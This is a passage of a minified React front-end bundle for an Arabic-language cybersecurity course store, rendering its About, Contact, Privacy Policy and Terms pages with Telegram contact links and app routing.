gap-3",children:[i.jsx("i",{"code-path":"src/pages/About.tsx:92:23",className:"fas fa-check-circle text-neon mt-1 shrink-0"}),i.jsx("span",{"code-path":"src/pages/About.tsx:93:23",className:"text-foreground/80",children:o})]},u))}),i.jsx("h3",{"code-path":"src/pages/About.tsx:98:17",className:"font-bold text-xl mb-4",children:"للتواصل الخاص"}),i.jsxs("a",{"code-path":"src/pages/About.tsx:99:17",href:"https://t.me/THE0AN2",target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 bg-[#0088cc] hover:bg-[#00aaff] text-white font-bold px-8 py-3 rounded-full transition-all hover:scale-105",children:[i.jsx("i",{"code-path":"src/pages/About.tsx:105:19",className:"fab fa-telegram-plane"}),"@THE0AN2 على تليجرام"]}),i.jsxs("p",{"code-path":"src/pages/About.tsx:109:17",className:"mt-6 text-sm text-muted-foreground",children:["المجموعة الأساسية لجميع الطلاب:"," ",i.jsx("a",{"code-path":"src/pages/About.tsx:111:19",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline font-semibold",children:"@Masry0Store"})]})]})})}),i.jsx(be,{"code-path":"src/pages/About.tsx:125:11",children:i.jsxs("div",{"code-path":"src/pages/About.tsx:126:13",className:"mb-8",children:[i.jsx("h3",{"code-path":"src/pages/About.tsx:127:15",className:"text-2xl font-bold text-center mb-8 gradient-text",children:"رحلتنا"}),i.jsx("div",{"code-path":"src/pages/About.tsx:128:15",className:"relative border-r-2 border-neon/20 pr-8 space-y-8",children:Ov.map((o,u)=>i.jsxs("div",{"code-path":"src/pages/About.tsx:130:19",className:"relative",children:[i.jsx("div",{"code-path":"src/pages/About.tsx:131:21",className:"absolute -right-[41px] w-5 h-5 rounded-full bg-neon/20 border-2 border-neon"}),i.jsxs("div",{"code-path":"src/pages/About.tsx:132:21",className:"glass-card rounded-2xl p-4",children:[i.jsx("span",{"code-path":"src/pages/About.tsx:133:23",className:"text-neon font-bold text-sm",children:o.year}),i.jsx("p",{"code-path":"src/pages/About.tsx:134:23",className:"text-foreground/80 text-sm mt-1",children:o.event})]})]},u))})]})}),i.jsx(be,{"code-path":"src/pages/About.tsx:143:11",children:i.jsxs("div",{"code-path":"src/pages/About.tsx:144:13",className:"note-box text-center",children:[i.jsx("i",{"code-path":"src/pages/About.tsx:145:15",className:"fas fa-quote-right text-neon/40 text-2xl mb-3 block"}),i.jsx("p",{"code-path":"src/pages/About.tsx:146:15",className:"text-foreground/80 italic text-lg leading-relaxed",children:'"أنا أؤمن بأن التعليم الأمني يجب أن يكون عملياً ومباشراً. لذلك أضع كل خبرتي في هذه المنصة لتكون مرجعك الأول في الأمن السيبراني."'})]})})]})})]})}const Hv=[{num:"1",text:"عند التواصل للمرة الأولى، يرجى ذكر الغرض بوضوح (شراء كورس، استفسار فني، اقتراح)."},{num:"2",text:"لا نقدم دعمًا عبر الواتساب أو أي تطبيق آخر - الاعتماد فقط على التليجرام."},{num:"3",text:"متوسط وقت الرد: أقل من 24 ساعة (غالبًا أسرع بكثير)."},{num:"4",text:"للحصول على تحديثات دورية، انضم إلى المجموعة الأساسية أولاً."}];function Lv(){return i.jsxs(xl,{"code-path":"src/pages/Contact.tsx:15:5",children:[i.jsxs("section",{"code-path":"src/pages/Contact.tsx:17:7",className:"relative py-20 px-4 overflow-hidden bg-cyber-surface/30",children:[i.jsx("div",{"code-path":"src/pages/Contact.tsx:18:9",className:"absolute inset-0 opacity-5",children:i.jsx("div",{"code-path":"src/pages/Contact.tsx:19:11",className:"absolute top-0 left-1/4 w-96 h-96 bg-neon rounded-full blur-[200px]"})}),i.jsx("div",{"code-path":"src/pages/Contact.tsx:21:9",className:"max-w-4xl mx-auto relative text-center",children:i.jsxs(be,{"code-path":"src/pages/Contact.tsx:22:11",children:[i.jsx("div",{"code-path":"src/pages/Contact.tsx:23:13",className:"w-16 h-16 rounded-2xl bg-neon/10 border border-neon/20 flex items-center justify-center mx-auto mb-6",children:i.jsx(lp,{"code-path":"src/pages/Contact.tsx:24:15",className:"w-8 h-8 text-neon"})}),i.jsx("h1",{"code-path":"src/pages/Contact.tsx:26:13",className:"neon-glow-text text-4xl sm:text-5xl mb-4",children:"طرق التواصل الرسمية"}),i.jsxs("p",{"code-path":"src/pages/Contact.tsx:27:13",className:"text-muted-foreground max-w-2xl mx-auto text-lg leading-relaxed",children:["جميع خدمات المبيعات والدعم الفني والاستفسارات تتم عvia ",i.jsx("strong",{"code-path":"src/pages/Contact.tsx:28:70",className:"text-neon",children:"التليجرام فقط"})," - لا واتساب، لا أرقام هواتف، لضمان السرعة والأمان."]})]})})]}),i.jsx("section",{"code-path":"src/pages/Contact.tsx:35:7",className:"py-16 px-4",children:i.jsxs("div",{"code-path":"src/pages/Contact.tsx:36:9",className:"max-w-4xl mx-auto",children:[i.jsxs("div",{"code-path":"src/pages/Contact.tsx:37:11",className:"grid grid-cols-1 md:grid-cols-2 gap-6 mb-10",children:[i.jsx(be,{"code-path":"src/pages/Contact.tsx:38:13",delay:0,children:i.jsx(pl,{"code-path":"src/pages/Contact.tsx:39:15",className:"glass-card border-neon/20 rounded-3xl text-center transition-all hover:-translate-y-2 hover:border-neon/50 h-full",children:i.jsxs(ml,{"code-path":"src/pages/Contact.tsx:40:17",className:"p-8",children:[i.jsx("div",{"code-path":"src/pages/Contact.tsx:41:19",className:"w-16 h-16 rounded-2xl bg-[#0088cc]/10 border border-[#0088cc]/20 flex items-center justify-center mx-auto mb-4",children:i.jsx(lp,{"code-path":"src/pages/Contact.tsx:42:21",className:"w-8 h-8 text-[#0088cc]"})}),i.jsx("h3",{"code-path":"src/pages/Contact.tsx:44:19",className:"text-xl font-bold mb-3",children:"المجموعة الأساسية"}),i.jsx("p",{"code-path":"src/pages/Contact.tsx:45:19",className:"text-muted-foreground text-sm mb-6 leading-relaxed",children:"انضم إلى مجتمع الطلاب - أخبار، عروض، دعم جماعي، مناقشات فنية، وملفات تعليمية."}),i.jsxs("a",{"code-path":"src/pages/Contact.tsx:48:19",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 bg-[#0088cc] hover:bg-[#00aaff] text-white font-bold px-6 py-3 rounded-full transition-all hover:scale-105",children:[i.jsx("i",{"code-path":"src/pages/Contact.tsx:54:21",className:"fab fa-telegram-plane"}),"انضمام فوري"]})]})})}),i.jsx(be,{"code-path":"src/pages/Contact.tsx:61:13",delay:150,children:i.jsx(pl,{"code-path":"src/pages/Contact.tsx:62:15",className:"glass-card border-neon/20 rounded-3xl text-center transition-all hover:-translate-y-2 hover:border-neon/50 h-full",children:i.jsxs(ml,{"code-path":"src/pages/Contact.tsx:63:17",className:"p-8",children:[i.jsx("div",{"code-path":"src/pages/Contact.tsx:64:19",className:"w-16 h-16 rounded-2xl bg-neon/10 border border-neon/20 flex items-center justify-center mx-auto mb-4",children:i.jsx(V0,{"code-path":"src/pages/Contact.tsx:65:21",className:"w-8 h-8 text-neon"})}),i.jsx("h3",{"code-path":"src/pages/Contact.tsx:67:19",className:"text-xl font-bold mb-3",children:"التواصل الخاص مع المدرب"}),i.jsx("p",{"code-path":"src/pages/Contact.tsx:68:19",className:"text-muted-foreground text-sm mb-6 leading-relaxed",children:"للاستفسارات الشخصية، شراء الكورسات، أو الدعم التقني الخاص (الرد خلال ساعات)."}),i.jsxs("a",{"code-path":"src/pages/Contact.tsx:71:19",href:"https://t.me/THE0AN2",target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 bg-[#0088cc] hover:bg-[#00aaff] text-white font-bold px-6 py-3 rounded-full transition-all hover:scale-105",children:[i.jsx("i",{"code-path":"src/pages/Contact.tsx:77:21",className:"fab fa-telegram-plane"}),"@THE0AN2"]})]})})})]}),i.jsx(be,{"code-path":"src/pages/Contact.tsx:86:11",children:i.jsx(pl,{"code-path":"src/pages/Contact.tsx:87:13",className:"bg-cyber-elevated border-border rounded-3xl mb-8",children:i.jsxs(ml,{"code-path":"src/pages/Contact.tsx:88:15",className:"p-6 sm:p-8",children:[i.jsxs("h3",{"code-path":"src/pages/Contact.tsx:89:17",className:"font-bold text-lg mb-5 flex items-center gap-2",children:[i.jsx(Zl,{"code-path":"src/pages/Contact.tsx:90:19",className:"w-5 h-5 text-neon"}),"إرشادات هامة"]}),i.jsx("div",{"code-path":"src/pages/Contact.tsx:93:17",className:"space-y-4",children:Hv.map(o=>i.jsxs("div",{"code-path":"src/pages/Contact.tsx:95:21",className:"flex items-start gap-3",children:[i.jsx("span",{"code-path":"src/pages/Contact.tsx:96:23",className:"shrink-0 w-6 h-6 rounded-full bg-neon/10 border border-neon/20 text-neon text-xs font-bold flex items-center justify-center",children:o.num}),i.jsx("p",{"code-path":"src/pages/Contact.tsx:99:23",className:"text-sm text-foreground/80 leading-relaxed",children:o.text})]},o.num))})]})})}),i.jsx(be,{"code-path":"src/pages/Contact.tsx:108:11",children:i.jsxs("div",{"code-path":"src/pages/Contact.tsx:109:13",className:"note-box text-center",children:[i.jsx(ns,{"code-path":"src/pages/Contact.tsx:110:15",className:"w-6 h-6 text-neon mx-auto mb-2"}),i.jsx("p",{"code-path":"src/pages/Contact.tsx:111:15",className:"text-sm text-foreground/80",children:"أوقات الدعم المباشر: السبت - الخميس (10 صباحًا - 10 مساءً بتوقيت القاهرة)."})]})})]})})]})}function Uv(){return i.jsx(xl,{"code-path":"src/pages/Privacy.tsx:5:5",children:i.jsx("div",{"code-path":"src/pages/Privacy.tsx:6:7",className:"py-12 px-4",children:i.jsx("div",{"code-path":"src/pages/Privacy.tsx:7:9",className:"max-w-4xl mx-auto",children:i.jsxs("div",{"code-path":"src/pages/Privacy.tsx:8:11",className:"bg-cyber-elevated border border-border rounded-3xl p-8 sm:p-12",children:[i.jsxs("h1",{"code-path":"src/pages/Privacy.tsx:9:13",className:"neon-glow-text text-3xl text-center mb-2",children:[i.jsx("i",{"code-path":"src/pages/Privacy.tsx:10:15",className:"fas fa-lock ml-2"}),"سياسة الخصوصية"]}),i.jsx("p",{"code-path":"src/pages/Privacy.tsx:13:13",className:"text-center text-muted-foreground mb-10",children:"آخر تحديث: 14 يونيو 2026"}),i.jsxs("div",{"code-path":"src/pages/Privacy.tsx:15:13",className:"space-y-8",children:[i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:16:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:17:17",className:"text-xl font-bold text-neon mb-3",children:"1. مقدمة"}),i.jsxs("p",{"code-path":"src/pages/Privacy.tsx:18:17",className:"text-foreground/80 leading-relaxed",children:["نحن في ",i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:19:26",children:"MASRY STORE"})," نلتزم بحماية خصوصية بياناتك الشخصية. توضح هذه السياسة كيفية جمع معلوماتك واستخدامها وحمايتها عند استخدام موقعنا الإلكتروني والخدمات المرتبطة به."]})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:23:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:24:17",className:"text-xl font-bold text-neon mb-3",children:"2. المعلومات التي نجمعها"}),i.jsxs("ul",{"code-path":"src/pages/Privacy.tsx:25:17",className:"space-y-2 text-foreground/80",children:[i.jsxs("li",{"code-path":"src/pages/Privacy.tsx:26:19",children:[i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:26:23",children:"معلومات الاتصال:"})," عندما تتواصل معنا عبر تليجرام أو البريد الإلكتروني."]}),i.jsxs("li",{"code-path":"src/pages/Privacy.tsx:27:19",children:[i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:27:23",children:"بيانات الاستخدام:"})," معلومات عن زياراتك للموقع (الصفحات، الوقت، نوع المتصفح)."]}),i.jsxs("li",{"code-path":"src/pages/Privacy.tsx:28:19",children:[i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:28:23",children:"ملفات تعريف الارتباط (Cookies):"})," نستخدمها لتحسين تجربة التصفح."]})]})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:32:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:33:17",className:"text-xl font-bold text-neon mb-3",children:"3. كيفية استخدام معلوماتك"}),i.jsxs("ul",{"code-path":"src/pages/Privacy.tsx:34:17",className:"space-y-2 text-foreground/80",children:[i.jsx("li",{"code-path":"src/pages/Privacy.tsx:35:19",children:"للرد على استفساراتك وتقديم الدعم الفني."}),i.jsx("li",{"code-path":"src/pages/Privacy.tsx:36:19",children:"لتحسين محتوى الموقع وخدماته."}),i.jsx("li",{"code-path":"src/pages/Privacy.tsx:37:19",children:"لإرسال تحديثات وعروض (فقط إذا وافقت على ذلك)."}),i.jsx("li",{"code-path":"src/pages/Privacy.tsx:38:19",children:"لمنع الاحتيال وضمان أمن المنصة."})]})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:42:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:43:17",className:"text-xl font-bold text-neon mb-3",children:"4. مشاركة المعلومات"}),i.jsxs("p",{"code-path":"src/pages/Privacy.tsx:44:17",className:"text-foreground/80 leading-relaxed",children:["نحن ",i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:45:23",children:"لا نبيع أو نؤجر أو نشارك"})," بياناتك الشخصية مع أي طرف ثالث لأغراض تسويقية."]})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:49:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:50:17",className:"text-xl font-bold text-neon mb-3",children:"5. أمان البيانات"}),i.jsx("p",{"code-path":"src/pages/Privacy.tsx:51:17",className:"text-foreground/80 leading-relaxed",children:"نستخدم إجراءات أمنية تقنية وإدارية لحماية بياناتك من الوصول غير المصرح به."})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:56:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:57:17",className:"text-xl font-bold text-neon mb-3",children:"6. حقوقك"}),i.jsxs("p",{"code-path":"src/pages/Privacy.tsx:58:17",className:"text-foreground/80 leading-relaxed",children:["لديك الحق في الوصول إلى بياناتك الشخصية، وتصحيحها، أو طلب حذفها. يمكنك ممارسة هذه الحقوق عن طريق التواصل معنا عبر تليجرام ",i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:59:141",children:"@THE0AN2"}),"."]})]}),i.jsxs("section",{"code-path":"src/pages/Privacy.tsx:63:15",children:[i.jsx("h2",{"code-path":"src/pages/Privacy.tsx:64:17",className:"text-xl font-bold text-neon mb-3",children:"7. التواصل معنا"}),i.jsxs("ul",{"code-path":"src/pages/Privacy.tsx:65:17",className:"space-y-2 text-foreground/80",children:[i.jsxs("li",{"code-path":"src/pages/Privacy.tsx:66:19",children:[i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:66:23",children:"تليجرام:"})," ",i.jsx("a",{"code-path":"src/pages/Privacy.tsx:66:49",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline",children:"@Masry0Store"})]}),i.jsxs("li",{"code-path":"src/pages/Privacy.tsx:67:19",children:[i.jsx("strong",{"code-path":"src/pages/Privacy.tsx:67:23",children:"المدرب:"})," ",i.jsx("a",{"code-path":"src/pages/Privacy.tsx:67:48",href:"https://t.me/THE0AN2",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline",children:"@THE0AN2"})]})]})]})]}),i.jsxs("div",{"code-path":"src/pages/Privacy.tsx:72:13",className:"note-box mt-8 text-center",children:[i.jsx("i",{"code-path":"src/pages/Privacy.tsx:73:15",className:"fas fa-check-circle text-neon text-lg mb-2 block"}),i.jsx("p",{"code-path":"src/pages/Privacy.tsx:74:15",className:"text-sm text-foreground/80",children:"باستخدامك لموقعنا، فإنك توافق على هذه السياسة."})]})]})})})})}function Bv(){return i.jsx(xl,{"code-path":"src/pages/Terms.tsx:5:5",children:i.jsx("div",{"code-path":"src/pages/Terms.tsx:6:7",className:"py-12 px-4",children:i.jsx("div",{"code-path":"src/pages/Terms.tsx:7:9",className:"max-w-4xl mx-auto",children:i.jsxs("div",{"code-path":"src/pages/Terms.tsx:8:11",className:"bg-cyber-elevated border border-border rounded-3xl p-8 sm:p-12",children:[i.jsxs("h1",{"code-path":"src/pages/Terms.tsx:9:13",className:"neon-glow-text text-3xl text-center mb-2",children:[i.jsx("i",{"code-path":"src/pages/Terms.tsx:10:15",className:"fas fa-gavel ml-2"}),"شروط وأحكام الاستخدام"]}),i.jsx("p",{"code-path":"src/pages/Terms.tsx:13:13",className:"text-center text-muted-foreground mb-10",children:"آخر تحديث: 14 يونيو 2026"}),i.jsxs("div",{"code-path":"src/pages/Terms.tsx:15:13",className:"space-y-8",children:[i.jsxs("section",{"code-path":"src/pages/Terms.tsx:16:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:17:17",className:"text-xl font-bold text-neon mb-3",children:"1. قبول الشروط"}),i.jsxs("p",{"code-path":"src/pages/Terms.tsx:18:17",className:"text-foreground/80 leading-relaxed",children:["باستخدامك لموقع ",i.jsx("strong",{"code-path":"src/pages/Terms.tsx:19:35",children:"MASRY STORE"}),"، فإنك توافق على الالتزام بهذه الشروط والأحكام. إذا كنت لا توافق، يرجى عدم استخدام الموقع."]})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:23:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:24:17",className:"text-xl font-bold text-neon mb-3",children:"2. الاستخدام الأخلاقي والقانوني"}),i.jsx("div",{"code-path":"src/pages/Terms.tsx:25:17",className:"warning-box",children:i.jsxs("p",{"code-path":"src/pages/Terms.tsx:26:19",className:"text-foreground/80",children:["جميع المواد التعليمية مخصصة لأغراض ",i.jsx("strong",{"code-path":"src/pages/Terms.tsx:27:56",children:"الهكر الأخلاقي واختبار الاختراق بإذن قانوني فقط"}),". يتحمل المستخدم المسؤولية الكاملة عن أي استخدام غير قانوني."]})}),i.jsxs("ul",{"code-path":"src/pages/Terms.tsx:30:17",className:"space-y-2 text-foreground/80 mt-4",children:[i.jsx("li",{"code-path":"src/pages/Terms.tsx:31:19",children:"يحظر استخدام المحتوى لاختراق أنظمة لا تملك إذنًا كتابيًا باختبارها."}),i.jsx("li",{"code-path":"src/pages/Terms.tsx:32:19",children:"يحظر إنشاء برمجيات ضارة لأغراض ضارة."}),i.jsx("li",{"code-path":"src/pages/Terms.tsx:33:19",children:"يحظر انتهاك خصوصية الآخرين."})]})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:37:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:38:17",className:"text-xl font-bold text-neon mb-3",children:"3. الملكية الفكرية"}),i.jsxs("p",{"code-path":"src/pages/Terms.tsx:39:17",className:"text-foreground/80 leading-relaxed",children:["جميع المحتويات المنشورة على الموقع هي ملك حصري لـ ",i.jsx("strong",{"code-path":"src/pages/Terms.tsx:40:69",children:"MASRY STORE"}),". لا يُسمح بنسخ أو توزيع أو إعادة نشر أي جزء دون إذن كتابي مسبق. الخطط التعليمية PDF المقدمة مجانًا هي للاستخدام الشخصي فقط."]})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:44:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:45:17",className:"text-xl font-bold text-neon mb-3",children:"4. الدورات المدفوعة"}),i.jsxs("ul",{"code-path":"src/pages/Terms.tsx:46:17",className:"space-y-2 text-foreground/80",children:[i.jsx("li",{"code-path":"src/pages/Terms.tsx:47:19",children:"شراء الدورة يعني ترخيصًا شخصيًا للوصول إلى المحتوى، وليس نقل الملكية."}),i.jsx("li",{"code-path":"src/pages/Terms.tsx:48:19",children:"لا يُسمح بمشاركة معلومات الدخول مع الآخرين."}),i.jsx("li",{"code-path":"src/pages/Terms.tsx:49:19",children:"بعد تفعيل الوصول، لا يمكن استرداد المبلغ ما لم تكن هناك مشكلة تقنية."}),i.jsx("li",{"code-path":"src/pages/Terms.tsx:50:19",children:"جميع عمليات الشراء تتم عبر التليجرام يدويًا."})]})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:54:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:55:17",className:"text-xl font-bold text-neon mb-3",children:"5. إخلاء المسؤولية"}),i.jsx("p",{"code-path":"src/pages/Terms.tsx:56:17",className:"text-foreground/80 leading-relaxed",children:'يتم تقديم المواد التعليمية "كما هي" (AS IS) دون أي ضمانات ضمنية. لا نضمن أن المحتوى خالٍ من الأخطاء. في حدود ما يسمح به القانون، لا يكون MASRY STORE مسؤولاً عن أي أضرار ناتجة عن استخدام الموقع.'})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:61:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:62:17",className:"text-xl font-bold text-neon mb-3",children:"6. التعديلات"}),i.jsx("p",{"code-path":"src/pages/Terms.tsx:63:17",className:"text-foreground/80 leading-relaxed",children:"قد نقوم بتحديث هذه الشروط من وقت لآخر. استمرارك في استخدام الموقع بعد التغييرات يعني قبولك للشروط المعدلة."})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:68:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:69:17",className:"text-xl font-bold text-neon mb-3",children:"7. القانون الواجب التطبيق"}),i.jsx("p",{"code-path":"src/pages/Terms.tsx:70:17",className:"text-foreground/80 leading-relaxed",children:"تخضع هذه الشروط وأي نزاعات ناشئة عنها لقوانين جمهورية مصر العربية."})]}),i.jsxs("section",{"code-path":"src/pages/Terms.tsx:75:15",children:[i.jsx("h2",{"code-path":"src/pages/Terms.tsx:76:17",className:"text-xl font-bold text-neon mb-3",children:"8. الاتصال بنا"}),i.jsxs("ul",{"code-path":"src/pages/Terms.tsx:77:17",className:"space-y-2 text-foreground/80",children:[i.jsxs("li",{"code-path":"src/pages/Terms.tsx:78:19",children:[i.jsx("strong",{"code-path":"src/pages/Terms.tsx:78:23",children:"تليجرام:"})," ",i.jsx("a",{"code-path":"src/pages/Terms.tsx:78:49",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline",children:"@Masry0Store"})]}),i.jsxs("li",{"code-path":"src/pages/Terms.tsx:79:19",children:[i.jsx("strong",{"code-path":"src/pages/Terms.tsx:79:23",children:"المدرب:"})," ",i.jsx("a",{"code-path":"src/pages/Terms.tsx:79:48",href:"https://t.me/THE0AN2",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline",children:"@THE0AN2"})]})]})]})]}),i.jsxs("div",{"code-path":"src/pages/Terms.tsx:84:13",className:"note-box mt-8 text-center",children:[i.jsx("i",{"code-path":"src/pages/Terms.tsx:85:15",className:"fas fa-gavel text-neon text-lg mb-2 block"}),i.jsx("p",{"code-path":"src/pages/Terms.tsx:86:15",className:"text-sm text-foreground/80",children:"باستخدامك للموقع، فإنك تقر بأنك قرأت وفهمت هذه الشروط وتوافق على الالتزام بها."})]})]})})})})}function Gv(){return i.jsxs(Hb,{"code-path":"src/App.tsx:13:5",children:[i.jsx(hl,{"code-path":"src/App.tsx:14:7",path:"/",element:i.jsx(mv,{"code-path":"src/App.tsx:14:32"})}),i.jsx(hl,{"code-path":"src/App.tsx:15:7",path:"/courses",element:i.jsx(Cv,{"code-path":"src/App.tsx:15:39"})}),i.jsx(hl,{"code-path":"src/App.tsx:16:7",path:"/learning-paths",element:i.jsx(Rv,{"code-path":"src/App.tsx:16:46"})}),i.jsx(hl,{"code-path":"src/App.tsx:17:7",path:"/learning-paths/:pathId",element:i.jsx(Dv,{"code-path":"src/App.tsx:17:54"})}),i.jsx(hl,{"code-path":"src/App.tsx:18:7",path:"/about",element:i.jsx(kv,{"code-path":"src/App.tsx:18:37"})}),i.jsx(hl,{"code-path":"src/App.tsx:19:7",path:"/contact",element:i.jsx(Lv,{"code-path":"src/App.tsx:19:39"})}),i.jsx(hl,{"code-path":"src/App.tsx:20:7",path:"/privacy",element:i.jsx(Uv,{"code-path":"src/App.tsx:20:39"})}),i.jsx(hl,{"code-path":"src/App.tsx:21:7",path:"/terms",element:i.jsx(Bv,{"code-path":"src/App.tsx:21:37"})})]})}Hx.createRoot(document.getElementById("root")).render(i.jsx(N.StrictMode,{"code-path":"src/main.tsx:8:3",children:i.jsx(o1,{"code-path":"src/main.tsx:9:5",children:i.jsx(Gv,{"code-path":"src/main.tsx:10:7"})})}));
